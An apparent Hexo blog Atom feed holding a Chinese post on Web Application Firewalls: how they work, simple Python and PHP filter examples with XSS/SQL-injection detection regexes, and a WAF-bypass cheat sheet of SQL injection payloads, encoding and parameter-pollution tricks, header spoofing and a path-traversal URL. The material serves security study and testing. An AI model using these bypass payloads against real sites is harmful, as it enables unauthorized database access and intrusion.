<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-06-07T16:10:44.593Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WAF</title>
    <link href="http://example.com/2024/06/07/WAF/"/>
    <id>http://example.com/2024/06/07/WAF/</id>
    <published>2024-06-06T16:12:45.000Z</published>
    <updated>2024-06-07T16:10:44.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="waf"><a class="markdownIt-Anchor" href="#waf">#</a> WAF</h1><p><code>WAF</code> （ <code>Web Application Firewall</code> ，网页应用防火墙）是一种专门设计用于保护 Web 应用程序的安全设备或软件，旨在通过监控、过滤和分析 HTTP/HTTPS 流量，防止常见的 Web 攻击，如 SQL 注入、跨站脚本（XSS）攻击和跨站请求伪造（CSRF）等</p><p>WAF 一般部署在 Web 服务器之前，用来保护 Web 应用</p><h2 id="waf与传统安全设备"><a class="markdownIt-Anchor" href="#waf与传统安全设备">#</a> WAF 与传统安全设备</h2><p>传统安全设备特点：</p><ul><li><p>IPS：针对蠕虫、网络病毒、后门木马防护，不具备 WEB 应用层的安全防护能力</p></li><li><p>传统 FW：作为内网与外网之间的一种访问控制设备，提供 3-4 层的安全防护能力，不具备 WEB 应用层的安全防护能力</p></li><li><p>UTM/NGFW: 优势，UTM 或者 NGFW 把多种安全能力融合为一体（上网行为管理、IPS、防病毒、WEB 安全防护）</p><p>劣势：各安全引擎模式开启之后设备综合性能势必降低！</p><p>n 多核架构 / MIPS 架构无法实现对 HTTP/HTTPS 数据包的深度检测（包括转换编码、拼接攻击语句、大小写变换、超大报文等），WEB 应用攻击的检出率低、漏报率高！</p></li></ul><h2 id="来自chatgpt对于waf与传统安全设备的区别的回答"><a class="markdownIt-Anchor" href="#来自chatgpt对于waf与传统安全设备的区别的回答">#</a> 来自 ChatGPT 对于 WAF 与传统安全设备的区别的回答：</h2><h3 id="1-保护对象"><a class="markdownIt-Anchor" href="#1-保护对象">#</a> 1. <strong>保护对象</strong></h3><ul><li><strong>WAF</strong>：专门保护 Web 应用程序，主要针对 HTTP/HTTPS 流量和应用层攻击，如 SQL 注入、跨站脚本（XSS）、跨站请求伪造（CSRF）等。</li><li><strong>传统防火墙</strong>：主要保护网络边界，控制网络层的流量，防止未授权访问和攻击，针对 IP、端口、协议等进行过滤。</li><li><strong>IDS/IPS</strong>：监控和分析网络流量以检测和阻止各种网络攻击和异常行为，保护整个网络环境。</li></ul><h3 id="2-工作层面"><a class="markdownIt-Anchor" href="#2-工作层面">#</a> 2. <strong>工作层面</strong></h3><p><img lazyload src="/images/loading.svg" data-src="https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202406070038139.png" alt="OSI七层网络协议 | Clei's Blog"></p><ul><li><strong>WAF</strong>：工作在应用层（OSI 模型的第 7 层），深入分析 Web 请求和响应，理解 HTTP/HTTPS 协议和 Web 应用逻辑。</li><li><strong>传统防火墙</strong>：工作在网络层（第 3 层）和传输层（第 4 层），关注 IP 地址、端口号和传输协议。</li><li><strong>IDS/IPS</strong>：通常工作在网络层和传输层，有时也涉及应用层，但主要用于广泛的网络流量监控和防护。</li></ul><h3 id="3-检测和防护方法"><a class="markdownIt-Anchor" href="#3-检测和防护方法">#</a> 3. <strong>检测和防护方法</strong></h3><ul><li><strong>WAF</strong>：使用签名检测、行为分析、规则引擎、学习模式等方法，针对 Web 特有的攻击进行深度检查和防护。</li><li><strong>传统防火墙</strong>：使用基于状态的包过滤、访问控制列表（ACL）、NAT 等方法，控制和管理进出网络的流量。</li><li><strong>IDS/IPS</strong>：使用签名检测、异常检测、协议分析等方法，检测并响应各种网络攻击，如 DDoS、端口扫描、恶意流量等。</li></ul><h3 id="4-部署位置"><a class="markdownIt-Anchor" href="#4-部署位置">#</a> 4. <strong>部署位置</strong></h3><ul><li><strong>WAF</strong>：通常部署在 Web 服务器前端，保护特定的 Web 应用程序或 Web 服务器。</li><li><strong>传统防火墙</strong>：部署在网络边界，如企业网络和互联网之间，保护整个网络的进出口。</li><li><strong>IDS/IPS</strong>：可以部署在网络的不同位置，如网络边界、内部网络段之间，或者靠近关键资源，监控并保护整个网络环境。</li></ul><h3 id="5-功能和用途"><a class="markdownIt-Anchor" href="#5-功能和用途">#</a> 5. <strong>功能和用途</strong></h3><ul><li>WAF：<ul><li>防护 Web 应用层攻击</li><li>HTTP/HTTPS 流量分析和过滤</li><li>Web 应用安全策略管理</li><li>输入验证和输出编码</li></ul></li><li>传统防火墙：<ul><li>网络访问控制和流量过滤</li><li>VPN 支持和流量加密</li><li>基于状态的包过滤</li><li>防止未授权访问</li></ul></li><li>IDS/IPS：<ul><li>实时监控和检测网络攻击</li><li>自动响应和阻止攻击（IPS）</li><li>网络行为分析和异常检测</li><li>事件日志记录和报告</li></ul></li></ul><h3 id="6-具体防护场景"><a class="markdownIt-Anchor" href="#6-具体防护场景">#</a> 6. <strong>具体防护场景</strong></h3><ul><li><strong>WAF</strong>：保护在线购物网站、Web 服务 API、内容管理系统（CMS）等 Web 应用程序，防止 Web 特有的攻击。</li><li><strong>传统防火墙</strong>：保护企业网络边界，控制内部网络和外部网络之间的流量，防止未经授权的访问和外部攻击。</li><li><strong>IDS/IPS</strong>：监控整个网络的流量，检测和阻止各种类型的攻击，保护网络中的所有设备和服务。</li></ul><h3 id="7-优势和劣势"><a class="markdownIt-Anchor" href="#7-优势和劣势">#</a> 7. <strong>优势和劣势</strong></h3><ul><li>WAF：<ul><li><strong>优势</strong>：深度保护 Web 应用程序，针对 Web 特有攻击提供精细化防护。</li><li><strong>劣势</strong>：只能保护 Web 应用，对非 HTTP/HTTPS 流量无效。</li></ul></li><li>传统防火墙：<ul><li><strong>优势</strong>：提供广泛的网络层和传输层保护，易于部署和管理。</li><li><strong>劣势</strong>：无法深入检查和理解应用层流量，难以防御复杂的应用层攻击。</li></ul></li><li>IDS/IPS：<ul><li><strong>优势</strong>：实时检测和响应各种网络攻击，保护整个网络环境。</li><li><strong>劣势</strong>：可能产生误报和漏报，配置和管理复杂。</li></ul></li></ul><h2 id="waf的工作原理"><a class="markdownIt-Anchor" href="#waf的工作原理">#</a> WAF 的工作原理</h2><h3 id="1-流量过滤"><a class="markdownIt-Anchor" href="#1-流量过滤">#</a> 1. <strong>流量过滤</strong></h3><p>WAF 通过拦截并检查所有进入和离开 Web 服务器的 HTTP/HTTPS 流量，确保只有合法和安全的请求能够到达应用程序。这包括：</p><ul><li><strong>请求过滤</strong>：检查每个请求的 URL、头信息、参数和正文内容。</li><li><strong>响应过滤</strong>：检查服务器返回的响应内容，防止敏感信息泄露。</li></ul><h3 id="2-签名检测"><a class="markdownIt-Anchor" href="#2-签名检测">#</a> 2. <strong>签名检测</strong></h3><p>WAF 使用预定义的攻击签名库来识别已知的攻击模式。当请求或响应匹配这些签名时，WAF 会采取相应的措施，如阻止请求、记录事件或向管理员发送警报。</p><ul><li><strong>例子</strong>：SQL 注入签名、XSS 攻击签名。</li></ul><h3 id="3-行为分析"><a class="markdownIt-Anchor" href="#3-行为分析">#</a> 3. <strong>行为分析</strong></h3><p>通过分析正常流量模式，WAF 可以建立基线并检测异常行为。这有助于识别零日攻击和其他未知威胁。</p><ul><li><strong>例子</strong>：如果某 IP 地址在短时间内发送了大量的请求，WAF 可以将其视为可能的攻击并阻止其进一步请求。可以防御 CC 攻击（但是无法完全防御 DDos 攻击）</li></ul><h3 id="4-规则引擎"><a class="markdownIt-Anchor" href="#4-规则引擎">#</a> 4. <strong>规则引擎</strong></h3><p>管理员可以根据特定需求和安全策略定义自定义规则。WAF 会根据这些规则检测并响应特定类型的流量。</p><ul><li><strong>例子</strong>：阻止来自某些地理位置的请求、限制特定 IP 地址的访问频率。</li></ul><h3 id="5-安全策略管理"><a class="markdownIt-Anchor" href="#5-安全策略管理">#</a> 5. <strong>安全策略管理</strong></h3><p>WAF 允许管理员定义和管理一系列安全策略，以适应不同的应用场景和需求。这些策略可以涵盖访问控制、输入验证、输出编码等方面。</p><ul><li><strong>例子</strong>：仅允许特定用户组访问某些敏感功能。</li></ul><h3 id="6-学习模式"><a class="markdownIt-Anchor" href="#6-学习模式">#</a> 6. <strong>学习模式</strong></h3><p>许多现代 WAF 具备学习模式功能，能够自动学习和适应应用程序的正常行为，并动态调整防护策略以应对不断变化的威胁环境。</p><ul><li><strong>例子</strong>：通过分析用户行为，自动调整防护规则以减少误报和漏报。</li></ul><h3 id="7-日志记录与审计"><a class="markdownIt-Anchor" href="#7-日志记录与审计">#</a> 7. <strong>日志记录与审计</strong></h3><p>WAF 记录所有检测到的威胁和采取的响应措施，生成详细的日志和报告，帮助管理员进行分析、审计和改进安全策略。</p><ul><li><strong>例子</strong>：记录所有阻止的 SQL 注入尝试，并生成每周安全报告。</li></ul><h3 id="8-集成与自动化"><a class="markdownIt-Anchor" href="#8-集成与自动化">#</a> 8. <strong>集成与自动化</strong></h3><p>WAF 可以与其他安全设备和软件集成，如防火墙、入侵检测系统（IDS）、入侵防御系统（IPS）等，以形成综合的安全防护体系。</p><ul><li><strong>例子</strong>：当 WAF 检测到某个攻击行为时，自动通知 IPS 进行进一步处理。</li></ul><h3 id="waf的工作流程"><a class="markdownIt-Anchor" href="#waf的工作流程">#</a> WAF 的工作流程</h3><ol><li><strong>接收请求</strong>：当用户向 Web 服务器发送 HTTP/HTTPS 请求时，WAF 首先接收该请求。</li><li><strong>分析请求</strong>：WAF 检查请求的各个部分，包括 URL、参数、头信息和正文内容，进行签名检测和行为分析。</li><li><strong>应用策略</strong>：根据预定义的安全策略和规则，决定如何处理该请求。可能的操作包括允许、阻止、记录或向管理员发送警报。</li><li><strong>转发请求</strong>：如果请求被允许，WAF 将其转发到 Web 服务器进行处理。</li><li><strong>监控响应</strong>：WAF 检查服务器返回的响应，确保没有敏感信息泄露或其他安全问题。</li><li><strong>返回响应</strong>：最后，WAF 将安全的响应返回给用户。</li></ol><h2 id="简单的自定义waf"><a class="markdownIt-Anchor" href="#简单的自定义waf">#</a> 简单的自定义 WAF</h2><p>编写代码来捕获和解析 HTTP/HTTPS 流量。可以使用以下库：</p><ul><li>Python:  <code>scapy</code> ,  <code>dpkt</code> ,  <code>http.server</code></li><li>Node.js:  <code>http</code> ,  <code>https</code></li><li>C/C++:  <code>libpcap</code> ,  <code>libnetfilter_queue</code></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleWAF</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.is_malicious_request(self.path):</span><br><span class="line">            self.send_response(<span class="number">403</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(<span class="string">b&quot;403 Forbidden&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.send_response(<span class="number">200</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(<span class="string">b&quot;Hello, World!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_malicious_request</span>(<span class="params">self, path</span>):</span><br><span class="line">        patterns = [</span><br><span class="line">            re.<span class="built_in">compile</span>(<span class="string">r&quot;(&lt;|%3C).*script.*(&gt;|%3E)&quot;</span>, re.IGNORECASE),  <span class="comment"># XSS</span></span><br><span class="line">            re.<span class="built_in">compile</span>(<span class="string">r&quot;(\%27)|(\&#x27;)|(\-\-)|(\%23)|(#)&quot;</span>, re.IGNORECASE),  <span class="comment"># SQL Injection</span></span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> pattern <span class="keyword">in</span> patterns:</span><br><span class="line">            <span class="keyword">if</span> pattern.search(path):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8080</span>), SimpleWAF)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting server at http://localhost:8080&quot;</span>)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleWAF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$patterns</span> = [</span><br><span class="line">        <span class="string">&#x27;/(&lt;|%3C).*script.*(&gt;|%3E)/i&#x27;</span>,  <span class="comment">// XSS</span></span><br><span class="line">        <span class="string">&#x27;/(\%27)|(\&#x27;)|(\-\-)|(\%23)|(#)/i&#x27;</span>,  <span class="comment">// SQL Injection</span></span><br><span class="line">        <span class="string">&#x27;/select\b|insert\b|update\b|delete\b|drop\b|union\b/i&#x27;</span>  <span class="comment">// SQL Keywords</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterRequest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkMalicious</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkMalicious</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_COOKIE</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkMalicious</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkMalicious</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;patterns <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">blockRequest</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">blockRequest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 403 Forbidden&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;403 Forbidden - Your request has been blocked by the WAF.&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 WAF</span></span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">SimpleWAF</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继续处理正常请求</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="waf-bypass"><a class="markdownIt-Anchor" href="#waf-bypass">#</a> WAF Bypass</h2><h3 id="超过waf配额绕过"><a class="markdownIt-Anchor" href="#超过waf配额绕过">#</a> 超过 WAF 配额绕过</h3><p>为不干扰到网站的正常运行，配置 WAF 检测额度内进行过滤，有些 WAF 就会设置如果数据包长度超过所检测的长度，就会对部分数据包或者是数据包的部分内容进行无检测 “放行”。</p><h4 id="增加参数个数"><a class="markdownIt-Anchor" href="#增加参数个数">#</a> 增加参数个数</h4><p>配置的原因，例如 safedog，只会检测前 100 个参数，把自己的执行语句放在 100 个之后</p><h4 id="增加参数长度"><a class="markdownIt-Anchor" href="#增加参数长度">#</a> 增加参数长度</h4><p>文件上传漏洞利用时，增加无意义数据，webshell 放在最后面；</p><p>SQL 注入时，增加 URL 编码长度，并注释掉；</p><p>xss 测试时加入无意义内容</p><h4 id="增加waf负载"><a class="markdownIt-Anchor" href="#增加waf负载">#</a> 增加 WAF 负载</h4><p>向 WAF 发送大量正常数据包，并发送异常数据包，导致站点流量过大，可能会对部分数据包进行检查，注意分寸，避免造成宕机。</p><h3 id="构造异常数据包"><a class="markdownIt-Anchor" href="#构造异常数据包">#</a> 构造异常数据包</h3><h4 id="双参数绕过"><a class="markdownIt-Anchor" href="#双参数绕过">#</a> 双参数绕过</h4><p>网站有一个 id 参数，在数据包中包含两个 id 参数进去，WAF 可能只检测第一个，第二个就会被服务器执行</p><h4 id="请求方式转换"><a class="markdownIt-Anchor" href="#请求方式转换">#</a> 请求方式转换</h4><p>根据对 WAF 配置的不同</p><p>如果 WAF 只检验 GET 类型的包，忽略 POST 类型的包，修改数据包类型尝试绕过</p><p>如果 WAF 只检验 POST 类型的包，忽略 GET 类型的包，修改数据包类型尝试绕过</p><p>有时，也可尝试，把数据包改为 request 类型等或根本就不存在的其他类型</p><p>另一方面：POST 在提交数据的时候有两种方式，第一种方式是使用 urlencode 的方式提交，第二种方式是使用 form-data 的方式提交。当我们在测试站点的时候，如果发现 POST 提交的数据被过滤掉了，此时可以考虑使用 form-data 的方式去提交。</p><h3 id="绕过匹配"><a class="markdownIt-Anchor" href="#绕过匹配">#</a> 绕过匹配</h3><h4 id="大小写变换"><a class="markdownIt-Anchor" href="#大小写变换">#</a> 大小写变换</h4><blockquote><p>?id=-1’ UnIOn SeLEct 1,VERsion(),3</p></blockquote><h4 id="将关键词进行等价替换"><a class="markdownIt-Anchor" href="#将关键词进行等价替换">#</a> 将关键词进行等价替换</h4><blockquote><p><code>Hex() bin()</code>  等价于 <code>ascii() </code></p><p><code>Sleep()</code>  等价于  <code>benchmark()</code></p><p><code>Mid()substring()</code>  等价于  <code>substr() </code></p><p><code>@@user </code> 等价于 <code>User()</code></p><p><code>@@Version </code> 等价于  <code>version()</code></p></blockquote><p>**greatest 替换 &gt; **</p><p><code>greatest</code>  返回两个值中大的那个</p><blockquote><p>?id=-1’ union select greatest(ascii(substr(database(),0,1)),1) --+</p></blockquote><p><strong>least  替换 &lt;</strong></p><p><code>least</code>  返回两个值中小的那个</p><blockquote><p>?id=-1’ union select least(ascii(substr(database(),0,1)),1000000) --+</p></blockquote><p><strong>strcmp 函数</strong></p><p>比较两个值大小，相等返回 0 后者比前者大返回 - 1 小返回 1</p><blockquote><p>?id=-1’ union select srtcmp(ascii(substr(database(),0,1)),100) --+</p></blockquote><p><strong>in 替换 =</strong></p><p>相等返回 1 不相等返回 0</p><blockquote><p>?id=-1’ union select substr(database()) in (“u”) --+</p></blockquote><p><strong>between and 替换 =</strong></p><blockquote><p>?id=-1’ union select substr(database()) between “a” and “u” --+</p></blockquote><p><strong>form for</strong></p><p>盲注过滤逗号</p><blockquote><p>?id=-1’ union select(database() form 0 for 1) --+</p></blockquote><p><strong>limit A offset B</strong></p><p>当过滤逗号时，limit 后面只能有一个参数，表示要取的数量，offset 表示跳过数量</p><blockquote><p>select * from users limit 3 offset 2</p></blockquote><h4 id="使用嵌套"><a class="markdownIt-Anchor" href="#使用嵌套">#</a> 使用嵌套</h4><p>对某些关键字替换为空，尝试采用嵌套双写进行绕过</p><blockquote><p>SELselectECT、UNunionION</p></blockquote><h4 id="使用编码"><a class="markdownIt-Anchor" href="#使用编码">#</a> 使用编码</h4><blockquote><p>Json<br>Unicode<br>base64<br>urlencode<br>html<br>Serialize</p></blockquote><p><strong>双重编码：</strong></p><p>WAF 又是会解码后过滤</p><h4 id="特殊符号"><a class="markdownIt-Anchor" href="#特殊符号">#</a> 特殊符号：</h4><p><strong>*+(-)(@)(!) 等替代空格 *</strong></p><blockquote><p>select+database()</p><p>select@database()</p></blockquote><p><strong>xor 逻辑异或</strong></p><p>任意一个数为 NULL 时，返回 NULL</p><p>非 NULL 的数，逻辑真假值相异，返回 1，否则为 0</p><blockquote><p>database()=“admin” xor 0</p></blockquote><p><code>/**/  ()  %0a  ``  2个空格</code>  替代 空格</p><blockquote><p>select/**/database()</p></blockquote><p><strong>替换 and or not xor</strong></p><blockquote><p>and ----&gt; &amp;&amp;    ,or ------&gt; ||  ,xor ------&gt; |     ,not -----&gt;  !</p></blockquote><p><strong>替换 =</strong></p><blockquote><p>like   rlike</p><p>where id rlike 1</p><p>where id like “admin”</p></blockquote><p><strong>union all select</strong></p><blockquote><p>select password from users where id rlike 1 union all select version();</p></blockquote><p><strong>注释符加换行绕过</strong></p><p><img lazyload src="/images/loading.svg" data-src="https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202406072010973.png" alt="image-20240607201043694"></p><blockquote><p>select #a database()</p><p>selelct %23%0a database()</p><p>(%23 表示注释  %0a 表示换行)</p></blockquote><p><strong>空字节</strong></p><p>有的过滤会碰到空字节会中止过滤</p><blockquote><p>?id=1 a%00nd 1=2……</p><p>?id=1 %00 and 1=2……</p></blockquote><p><strong>宽字节</strong></p><blockquote><p>union = uю%69яю这里把 i 不用宽字节 直接 url 编码 其他的字符都用对应的宽字节<br> select = こхlх%уt //t 不编码 其他的都宽字节 中间插上 %<br> from = цR%яэ // 宽字节 +%<br> 空格 =%20=%ва //в是 2 的款字符 а是 0 的宽字符<br>，= Ь //, 号的宽字节</p></blockquote><h3 id="http-参数污染"><a class="markdownIt-Anchor" href="#http-参数污染">#</a> http 参数污染</h3><p>利用参数污染来导致网站和安全狗接受数据的不一致性，实现绕过的操作。当 get 方式进行传参时，经过 &amp; 符号传入多个参数，WAF 可能只检测第一个参数的值，然后台却检测最后一个传入的值，此时能够绕过 WAF 的防护</p><p>下图即每种服务器获得到的参数</p><p><img lazyload src="/images/loading.svg" data-src="https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202406072026847.png" alt="image-20240607202628738"></p><p><code>?id=1/**&amp;id=-1' union select 1,database(),3 #*/ </code></p><p>安全狗收到的：  <code>1/**&amp;id=-1' union select 1,database(),3 #*/    </code></p><p>被注释，没法执行，安全狗会忽略</p><p>网站收到的：  <code>-1' union select 1,database(),3 #*/     </code></p><p>被带入执行</p><h3 id="构造畸形请求包"><a class="markdownIt-Anchor" href="#构造畸形请求包">#</a> <strong>构造畸形请求包</strong></h3><p>(1) 删掉 content-type</p><p>(2) 构造多个 filename</p><p>(3) content-type 后面加 TABLE 键</p><p>(4) 换行 boundary</p><p>(5) 文件名前面加空格</p><p>(6) 文件名前面加单引号</p><h3 id="白名单bypass"><a class="markdownIt-Anchor" href="#白名单bypass">#</a> 白名单 Bypass</h3><p>方式一：IP 白名单</p><p>从网络层获取的 ip，这种一般伪造不来，如果是应用层的获取的 IP，这样就可能存在伪造白名单 IP 造成 bypass。</p><p>测试方法：修改 http 的 header 来 bypass WAF</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-forwarded-for</span><br><span class="line">X-remote-IP</span><br><span class="line">X-originating-IP</span><br><span class="line">x-remote-addr</span><br><span class="line">X-Real-ip</span><br></pre></td></tr></table></figure></div><p>方式二：静态资源</p><p>特定的静态资源后缀请求，常见的静态文件 (.js .jpg .swf .css 等等)，类似白名单机制，WAF 为了检测效率，不去检测这样一些静态文件名后缀的请求。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.9.9.201/sql.php/1.js?id=1</span><br><span class="line"># Aspx/php只识别到前面的.aspx/.php 后面基本不识别</span><br></pre></td></tr></table></figure></div><p>方式三：url 白名单</p><p>为了防止误拦，部分 WAF 内置默认的白名单列表，如 admin/manager/system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.9.9.201/sql.php/admin.php?id=1</span><br><span class="line">http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd</span><br><span class="line">http://10.9.9.201/../../../manage/../sql.asp?id=2</span><br></pre></td></tr></table></figure></div><p>WAF 通过 /manage/&quot; 进行比较，只要 uri 中存在 /manage/ 就作为白名单不进行检测，这样我们可以通过 /sql.php?a=/manage/&amp;b=…/etc/passwd 绕过防御规则。</p><p>方式四：爬虫白名单</p><p>部分 WAF 有提供爬虫白名单的功能，识别爬虫的技术一般有两种：</p><p>1、 根据 UserAgent 2、通过行为来判断</p><p>UserAgent 可以很容易欺骗，我们可以伪装成爬虫尝试绕过。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;waf&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#waf&quot;&gt;#&lt;/a&gt; WAF&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;WAF&lt;/code&gt; （ &lt;code&gt;Web Application Firewall&lt;/code&gt; ，网页应用防火墙）是一</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>about XML</title>
    <link href="http://example.com/2024/05/29/about-XML/"/>
    <id>http://example.com/2024/05/29/about-XML/</id>
    <published>2024-05-29T04:24:33.000Z</published>
    <updated>2024-06-06T04:01:59.203Z</updated>
    
